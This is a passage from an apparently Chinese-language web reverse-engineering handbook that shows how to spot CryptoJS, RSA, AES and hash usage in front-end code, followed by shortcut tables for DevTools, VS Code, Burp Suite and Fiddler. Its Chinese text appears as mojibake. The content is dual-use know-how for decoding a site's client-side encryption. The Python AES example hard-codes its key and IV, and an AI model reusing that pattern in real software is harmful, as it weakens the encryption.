      <h2 id="javascript-åº“ç‰¹å¾">JavaScript åº“ç‰¹å¾</h2>

      <h3 id="cryptojs">CryptoJS</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ç‰¹å¾ä»£ç </span>
<span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">MD5</span><span class="p">(</span><span class="nx">text</span><span class="p">)</span>
<span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">SHA256</span><span class="p">(</span><span class="nx">text</span><span class="p">)</span>
<span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">text</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">)</span>
<span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">enc</span><span class="p">.</span><span class="nx">Base64</span><span class="p">.</span><span class="nx">stringify</span><span class="p">()</span>
<span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">lib</span><span class="p">.</span><span class="nx">WordArray</span>
</code></pre>
      </div>

      <p><strong>è¯†åˆ«è¦ç‚¹</strong>:</p>

      <ul>
        <li>å…¨å±€å˜é‡ <code>CryptoJS</code></li>
        <li>å¼•å…¥ CDN: <code>crypto-js.min.js</code></li>
        <li>æ–¹æ³•è°ƒç”¨æ ¼å¼: <code>CryptoJS.ç®—æ³•å.æ–¹æ³•</code></li>
      </ul>

      <h3 id="crypto-nodejs">crypto (Node.js)</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">crypto</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>

<span class="c1">// MD5</span>
<span class="nx">crypto</span><span class="p">.</span><span class="nx">createHash</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">text</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>

<span class="c1">// HMAC</span>
<span class="nx">crypto</span><span class="p">.</span><span class="nx">createHmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">text</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>

<span class="c1">// AES</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">cipher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">crypto</span><span class="p">.</span><span class="nx">createCipheriv</span><span class="p">(</span><span class="s1">&#39;aes-256-cbc&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">iv</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="web-crypto-api">Web Crypto API</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// ç‰¹å¾ä»£ç </span>
<span class="nb">window</span><span class="p">.</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">subtle</span><span class="p">.</span><span class="nx">digest</span><span class="p">(</span><span class="s1">&#39;SHA-256&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">subtle</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">algorithm</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">getRandomValues</span><span class="p">(</span><span class="nx">array</span><span class="p">)</span>
</code></pre>
      </div>

      <h2 id="å¸¸è§åŠ å¯†æ¨¡å¼">å¸¸è§åŠ å¯†æ¨¡å¼</h2>

      <h3 id="å¯¹ç§°åŠ å¯†aes">å¯¹ç§°åŠ å¯†ï¼ˆAESï¼‰</h3>

      <table>
        <thead>
          <tr>
            <th>æ¨¡å¼</th>
            <th>ç‰¹å¾</th>
            <th>å‚æ•°</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>AES-ECB</strong></td>
            <td>æœ€ç®€å•ï¼Œä¸å®‰å…¨</td>
            <td>åªéœ€ key</td>
          </tr>
          <tr>
            <td><strong>AES-CBC</strong></td>
            <td>éœ€è¦ IV</td>
            <td>key + iv</td>
          </tr>
          <tr>
            <td><strong>AES-CTR</strong></td>
            <td>è®¡æ•°å™¨æ¨¡å¼</td>
            <td>key + counter</td>
          </tr>
          <tr>
            <td><strong>AES-GCM</strong></td>
            <td>è®¤è¯åŠ å¯†</td>
            <td>key + iv + tag</td>
          </tr>
        </tbody>
      </table>

      <p><strong>è¯†åˆ«ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// CBC æ¨¡å¼</span>
<span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">AES</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">text</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">iv</span><span class="o">:</span><span class="w"> </span><span class="nx">iv</span><span class="p">,</span>
<span class="w">    </span><span class="nx">mode</span><span class="o">:</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">mode</span><span class="p">.</span><span class="nx">CBC</span><span class="p">,</span>
<span class="w">    </span><span class="nx">padding</span><span class="o">:</span><span class="w"> </span><span class="nx">CryptoJS</span><span class="p">.</span><span class="nx">pad</span><span class="p">.</span><span class="nx">Pkcs7</span>
<span class="p">})</span>
</code></pre>
      </div>

      <h3 id="éå¯¹ç§°åŠ å¯†rsa">éå¯¹ç§°åŠ å¯†ï¼ˆRSAï¼‰</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// JSEncrypt ç‰¹å¾</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">encrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">JSEncrypt</span><span class="p">();</span>
<span class="nx">encrypt</span><span class="p">.</span><span class="nx">setPublicKey</span><span class="p">(</span><span class="nx">publicKey</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">encrypted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">encrypt</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">text</span><span class="p">);</span>
</code></pre>
      </div>

      <h2 id="hash-ç®—æ³•ç‰¹å¾è¡¨">Hash ç®—æ³•ç‰¹å¾è¡¨</h2>

      <table>
        <thead>
          <tr>
            <th>è¾“å…¥</th>
            <th>MD5</th>
            <th>SHA1</th>
            <th>SHA256</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>""</code> (ç©ºå­—ç¬¦ä¸²)</td>
            <td><code>d41d8cd98f00b204...</code></td>
            <td><code>da39a3ee5e6b4b0d...</code></td>
            <td><code>e3b0c44298fc1c14...</code></td>
          </tr>
          <tr>
            <td><code>"a"</code></td>
            <td><code>0cc175b9c0f1b6a8...</code></td>
            <td><code>86f7e437faa5a7fc...</code></td>
            <td><code>ca978112ca1bbdca...</code></td>
          </tr>
          <tr>
            <td><code>"123456"</code></td>
            <td><code>e10adc3949ba59ab...</code></td>
            <td><code>7c4a8d09ca3762af...</code></td>
            <td><code>8d969eef6ecad3c2...</code></td>
          </tr>
        </tbody>
      </table>

      <p><strong>å¿«é€ŸéªŒè¯</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;123456&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
<span class="c1"># &#39;e10adc3949ba59abbe56e057f20f883e&#39;</span>
</code></pre>
      </div>

      <h2 id="æ··æ·†åçš„è¯†åˆ«">æ··æ·†åçš„è¯†åˆ«</h2>

      <h3 id="ç‰¹å¾å­—ç¬¦ä¸²">ç‰¹å¾å­—ç¬¦ä¸²</h3>

      <p>æœç´¢è¿™äº›å…³é”®å­—ï¼š</p>

      <pre><code>"MD5"
"SHA"
"AES"
"RSA"
"encrypt"
"decrypt"
"cipher"
"hash"
"digest"
"0123456789ABCDEF"  // åå…­è¿›åˆ¶å­—ç¬¦é›†
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"  // Base64
</code></pre>

      <h3 id="ç‰¹å¾å‡½æ•°">ç‰¹å¾å‡½æ•°</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// MD5 ç‰¹å¾ - å¸¸é‡</span>
<span class="mh">0x67452301</span><span class="p">,</span><span class="w"> </span><span class="mh">0xefcdab89</span><span class="p">,</span><span class="w"> </span><span class="mh">0x98badcfe</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10325476</span>

<span class="c1">// AES ç‰¹å¾ - S-Box</span>
<span class="p">[</span><span class="mh">0x63</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x77</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7b</span><span class="p">,</span><span class="w"> </span><span class="p">...]</span>

<span class="c1">// Base64 ç‰¹å¾</span>
<span class="s2">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>
</code></pre>
      </div>

      <h2 id="åŠ å¯†å‚æ•°å¸¸è§åç§°">åŠ å¯†å‚æ•°å¸¸è§åç§°</h2>

      <table>
        <thead>
          <tr>
            <th>ç”¨é€”</th>
            <th>å¸¸è§å˜é‡å</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>å¯†é’¥</strong></td>
            <td><code>key</code>, <code>secret</code>, <code>secretKey</code>, <code>password</code></td>
          </tr>
          <tr>
            <td><strong>åˆå§‹å‘é‡</strong></td>
            <td><code>iv</code>, <code>ivBytes</code>, <code>nonce</code></td>
          </tr>
          <tr>
            <td><strong>ç›</strong></td>
            <td><code>salt</code>, <code>randomSalt</code></td>
          </tr>
          <tr>
            <td><strong>ç­¾å</strong></td>
            <td><code>sign</code>, <code>signature</code>, <code>hash</code></td>
          </tr>
          <tr>
            <td><strong>æ—¶é—´æˆ³</strong></td>
            <td><code>timestamp</code>, <code>ts</code>, <code>time</code>, <code>nonce</code></td>
          </tr>
        </tbody>
      </table>

      <h2 id="å¿«é€Ÿè¯†åˆ«æµç¨‹">å¿«é€Ÿè¯†åˆ«æµç¨‹</h2>

      <pre><code>graph TD
    A[å‘ç°åŠ å¯†å­—ç¬¦ä¸²] --&gt; B{æ£€æŸ¥é•¿åº¦}
    B --&gt;|32å­—ç¬¦| C[å¯èƒ½æ˜¯MD5]
    B --&gt;|40å­—ç¬¦| D[å¯èƒ½æ˜¯SHA1]
    B --&gt;|64å­—ç¬¦| E[å¯èƒ½æ˜¯SHA256]
    B --&gt;|å¯å˜é•¿åº¦| F{æ£€æŸ¥æ ¼å¼}
    F --&gt;|Base64| G[å¯èƒ½æ˜¯AES]
    F --&gt;|åå…­è¿›åˆ¶| H[æ£€æŸ¥æ˜¯å¦æ˜¯Hash]
</code></pre>

      <h2 id="python-å®ç°å¯¹ç…§">Python å®ç°å¯¹ç…§</h2>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Util.Padding</span><span class="w"> </span><span class="kn">import</span> <span class="n">pad</span><span class="p">,</span> <span class="n">unpad</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>

<span class="c1"># MD5</span>
<span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;text&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="c1"># SHA256</span>
<span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;text&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="c1"># HMAC-SHA256</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">hmac</span>
<span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;key&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;text&#39;</span><span class="p">,</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

<span class="c1"># AES-CBC åŠ å¯†</span>
<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;1234567890abcdef&#39;</span>  <span class="c1"># 16å­—èŠ‚</span>
<span class="n">iv</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;abcdefghijklmnop&#39;</span>   <span class="c1"># 16å­—èŠ‚</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
<span class="n">encrypted</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;plaintext&#39;</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">))</span>
<span class="n">encrypted_b64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>

<span class="c1"># AES-CBC è§£å¯†</span>
<span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
<span class="n">decrypted</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encrypted_b64</span><span class="p">)),</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
</code></pre>
      </div>

      <h2 id="å¸¸è§åŠ å¯†åº“-cdn">å¸¸è§åŠ å¯†åº“ CDN</h2>

      <p>è¯†åˆ«ä½¿ç”¨çš„åŠ å¯†åº“ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="cm">&lt;!-- CryptoJS --&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>

<span class="cm">&lt;!-- JSEncrypt (RSA) --&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://cdn.jsdelivr.net/npm/jsencrypt/bin/jsencrypt.min.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>

<span class="cm">&lt;!-- Forge --&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://cdn.jsdelivr.net/npm/node-forge/dist/forge.min.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>

<span class="cm">&lt;!-- sjcl (Stanford JavaScript Crypto Library) --&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://bitwiseshiftleft.github.io/sjcl/sjcl.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre>
      </div>

      <h2 id="ç›¸å…³ç« èŠ‚">ğŸ“š ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#03-Basic-Recipes-crypto-identification">åŠ å¯†ç®—æ³•è¯†åˆ«</a></li>
        <li><a href="#00-Quick-Start-decrypt-api-params">è§£å¯† API å‚æ•°</a></li>
        <li><a href="#07-Scripts-crypto-detection-scripts">åŠ å¯†æ£€æµ‹è„šæœ¬</a></li>
      </ul>

    </div>

    <div class="section" id="08-Cheat-Sheets-tool-shortcuts">
      <h2>65. Tool Shortcuts</h2>
      <h1 id="å·¥å…·å¿«æ·é”®é€ŸæŸ¥è¡¨">å·¥å…·å¿«æ·é”®é€ŸæŸ¥è¡¨</h1>

      <h2 id="chrome-devtools">Chrome DevTools</h2>

      <h3 id="æ‰“å¼€åˆ‡æ¢é¢æ¿">æ‰“å¼€/åˆ‡æ¢é¢æ¿</h3>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>F12</code></td>
            <td>æ‰“å¼€/å…³é—­ DevTools</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+I</code> (Win) / <code>Cmd+Option+I</code> (Mac)</td>
            <td>æ‰“å¼€/å…³é—­ DevTools</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+J</code> (Win) / <code>Cmd+Option+J</code> (Mac)</td>
            <td>ç›´æ¥æ‰“å¼€ Console</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+C</code> (Win) / <code>Cmd+Option+C</code> (Mac)</td>
            <td>å…ƒç´ æ£€æŸ¥æ¨¡å¼</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+M</code> (Win) / <code>Cmd+Shift+M</code> (Mac)</td>
            <td>è®¾å¤‡æ¨¡æ‹Ÿæ¨¡å¼</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+P</code> (Win) / <code>Cmd+Shift+P</code> (Mac)</td>
            <td>å‘½ä»¤é¢æ¿</td>
          </tr>
          <tr>
            <td><code>Ctrl+[</code> / <code>Ctrl+]</code></td>
            <td>åˆ‡æ¢é¢æ¿</td>
          </tr>
          <tr>
            <td><code>Esc</code></td>
            <td>æ˜¾ç¤º/éšè—æŠ½å±‰ (Console)</td>
          </tr>
        </tbody>
      </table>

      <h3 id="sources-é¢æ¿">Sources é¢æ¿</h3>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>F8</code></td>
            <td>æš‚åœ/ç»§ç»­</td>
          </tr>
          <tr>
            <td><code>F9</code></td>
            <td>è®¾ç½®/å–æ¶ˆæ–­ç‚¹</td>
          </tr>
          <tr>
            <td><code>F10</code></td>
            <td>å•æ­¥è·³è¿‡</td>
          </tr>
          <tr>
            <td><code>F11</code></td>
            <td>å•æ­¥è¿›å…¥</td>
          </tr>
          <tr>
            <td><code>Shift+F11</code></td>
            <td>å•æ­¥è·³å‡º</td>
          </tr>
          <tr>
            <td><code>Ctrl+F</code></td>
            <td>æœç´¢æ–‡ä»¶</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+F</code></td>
            <td>å…¨å±€æœç´¢</td>
          </tr>
          <tr>
            <td><code>Ctrl+G</code></td>
            <td>è·³è½¬åˆ°è¡Œ</td>
          </tr>
          <tr>
            <td><code>Ctrl+O</code> / <code>Ctrl+P</code></td>
            <td>æ‰“å¼€æ–‡ä»¶</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+O</code></td>
            <td>è·³è½¬åˆ°å‡½æ•°</td>
          </tr>
        </tbody>
      </table>

      <h3 id="console-é¢æ¿">Console é¢æ¿</h3>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Ctrl+L</code></td>
            <td>æ¸…ç©º Console</td>
          </tr>
          <tr>
            <td><code>â†‘</code> / <code>â†“</code></td>
            <td>å†å²å‘½ä»¤å¯¼èˆª</td>
          </tr>
          <tr>
            <td><code>Tab</code></td>
            <td>è‡ªåŠ¨è¡¥å…¨</td>
          </tr>
          <tr>
            <td><code>Ctrl+U</code></td>
            <td>æ¸…é™¤å½“å‰è¾“å…¥</td>
          </tr>
        </tbody>
      </table>

      <h3 id="elements-é¢æ¿">Elements é¢æ¿</h3>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>â†‘</code> / <code>â†“</code></td>
            <td>å¯¼èˆª DOMæ ‘</td>
          </tr>
          <tr>
            <td><code>â†’</code></td>
            <td>å±•å¼€èŠ‚ç‚¹</td>
          </tr>
          <tr>
            <td><code>â†</code></td>
            <td>æ”¶èµ·èŠ‚ç‚¹</td>
          </tr>
          <tr>
            <td><code>F2</code></td>
            <td>ç¼–è¾‘ HTML</td>
          </tr>
          <tr>
            <td><code>Delete</code></td>
            <td>åˆ é™¤èŠ‚ç‚¹</td>
          </tr>
          <tr>
            <td><code>Ctrl+Z</code></td>
            <td>æ’¤é”€</td>
          </tr>
          <tr>
            <td><code>H</code></td>
            <td>éšè—/æ˜¾ç¤ºå…ƒç´ </td>
          </tr>
        </tbody>
      </table>

      <h3 id="network-é¢æ¿">Network é¢æ¿</h3>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Ctrl+R</code></td>
            <td>é‡æ–°åŠ è½½</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+R</code></td>
            <td>å¼ºåˆ¶é‡æ–°åŠ è½½</td>
          </tr>
          <tr>
            <td><code>Ctrl+E</code></td>
            <td>å¼€å§‹/åœæ­¢å½•åˆ¶</td>
          </tr>
          <tr>
            <td><code>Ctrl+F</code></td>
            <td>æœç´¢è¯·æ±‚</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="vs-code">VS Code</h2>

      <h3 id="é€šç”¨">é€šç”¨</h3>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Ctrl+P</code></td>
            <td>å¿«é€Ÿæ‰“å¼€æ–‡ä»¶</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+P</code></td>
            <td>å‘½ä»¤é¢æ¿</td>
          </tr>
          <tr>
            <td><code>Ctrl+B</code></td>
            <td>åˆ‡æ¢ä¾§è¾¹æ </td>
          </tr>
          <tr>
            <td><code>Ctrl+\</code></td>
            <td>æ‹†åˆ†ç¼–è¾‘å™¨</td>
          </tr>
          <tr>
            <td><code>Ctrl+W</code></td>
            <td>å…³é—­ç¼–è¾‘å™¨</td>
          </tr>
          <tr>
            <td><code>Ctrl+Tab</code></td>
            <td>åˆ‡æ¢ç¼–è¾‘å™¨</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+N</code></td>
            <td>æ–°çª—å£</td>
          </tr>
        </tbody>
      </table>

      <h3 id="ç¼–è¾‘">ç¼–è¾‘</h3>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Ctrl+X</code></td>
            <td>å‰ªåˆ‡è¡Œ</td>
          </tr>
          <tr>
            <td><code>Ctrl+C</code></td>
            <td>å¤åˆ¶è¡Œ</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+K</code></td>
            <td>åˆ é™¤è¡Œ</td>
          </tr>
          <tr>
            <td><code>Alt+â†‘/â†“</code></td>
            <td>ç§»åŠ¨è¡Œ</td>
          </tr>
          <tr>
            <td><code>Shift+Alt+â†‘/â†“</code></td>
            <td>å¤åˆ¶è¡Œ</td>
          </tr>
          <tr>
            <td><code>Ctrl+/</code></td>
            <td>åˆ‡æ¢æ³¨é‡Š</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+[</code> / <code>]</code></td>
            <td>æŠ˜å /å±•å¼€ä»£ç å—</td>
          </tr>
          <tr>
            <td><code>Ctrl+D</code></td>
            <td>é€‰æ‹©ä¸‹ä¸€ä¸ªç›¸åŒå†…å®¹</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+L</code></td>
            <td>é€‰æ‹©æ‰€æœ‰ç›¸åŒå†…å®¹</td>
          </tr>
          <tr>
            <td><code>Alt+Click</code></td>
            <td>å¤šå…‰æ ‡</td>
          </tr>
        </tbody>
      </table>

      <h3 id="æœç´¢æ›¿æ¢">æœç´¢/æ›¿æ¢</h3>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Ctrl+F</code></td>
            <td>æŸ¥æ‰¾</td>
          </tr>
          <tr>
            <td><code>Ctrl+H</code></td>
            <td>æ›¿æ¢</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+F</code></td>
            <td>å…¨å±€æŸ¥æ‰¾</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+H</code></td>
            <td>å…¨å±€æ›¿æ¢</td>
          </tr>
          <tr>
            <td><code>F3</code> / <code>Shift+F3</code></td>
            <td>æŸ¥æ‰¾ä¸‹ä¸€ä¸ª/ä¸Šä¸€ä¸ª</td>
          </tr>
        </tbody>
      </table>

      <h3 id="è°ƒè¯•">è°ƒè¯•</h3>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>F5</code></td>
            <td>å¼€å§‹/ç»§ç»­è°ƒè¯•</td>
          </tr>
          <tr>
            <td><code>F9</code></td>
            <td>åˆ‡æ¢æ–­ç‚¹</td>
          </tr>
          <tr>
            <td><code>F10</code></td>
            <td>å•æ­¥è·³è¿‡</td>
          </tr>
          <tr>
            <td><code>F11</code></td>
            <td>å•æ­¥è¿›å…¥</td>
          </tr>
          <tr>
            <td><code>Shift+F11</code></td>
            <td>å•æ­¥è·³å‡º</td>
          </tr>
          <tr>
            <td><code>Shift+F5</code></td>
            <td>åœæ­¢è°ƒè¯•</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="burp-suite">Burp Suite</h2>

      <h3 id="é€šç”¨-2">é€šç”¨</h3>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Ctrl+Shift+P</code></td>
            <td>å‰è¿›åˆ°ä¸‹ä¸€ä¸ªæ ‡ç­¾é¡µ</td>
          </tr>
          <tr>
            <td><code>Ctrl+Shift+N</code></td>
            <td>åé€€åˆ°ä¸Šä¸€ä¸ªæ ‡ç­¾é¡µ</td>
          </tr>
          <tr>
            <td><code>Ctrl+T</code></td>
            <td>è½¬å‘è¯·æ±‚åˆ°å…¶ä»–å·¥å…·</td>
          </tr>
        </tbody>
      </table>

      <h3 id="proxy-æ‹¦æˆª">Proxy æ‹¦æˆª</h3>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Ctrl+F</code></td>
            <td>è½¬å‘è¯·æ±‚</td>
          </tr>
          <tr>
            <td><code>Ctrl+D</code></td>
            <td>ä¸¢å¼ƒè¯·æ±‚</td>
          </tr>
          <tr>
            <td><code>Ctrl+I</code></td>
            <td>åˆ‡æ¢æ‹¦æˆªå¼€/å…³</td>
          </tr>
          <tr>
            <td><code>Ctrl+R</code></td>
            <td>å‘é€åˆ° Repeater</td>
          </tr>
          <tr>
            <td><code>Ctrl+S</code></td>
            <td>å‘é€åˆ° Scanner</td>
          </tr>
        </tbody>
      </table>

      <h3 id="repeater">Repeater</h3>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Ctrl+Space</code></td>
            <td>å‘é€è¯·æ±‚</td>
          </tr>
          <tr>
            <td><code>Ctrl+R</code></td>
            <td>åˆ‡æ¢åŸå§‹/ç¾åŒ–è§†å›¾</td>
          </tr>
        </tbody>
      </table>

      <h3 id="intruder">Intruder</h3>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>Ctrl+I</code></td>
            <td>å¼€å§‹æ”»å‡»</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="fiddler">Fiddler</h2>

      <table>
        <thead>
          <tr>
            <th>å¿«æ·é”®</th>
            <th>åŠŸèƒ½</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><code>F12</code></td>
            <td>å¼€å§‹/åœæ­¢æ•è·</td>
          </tr>
          <tr>
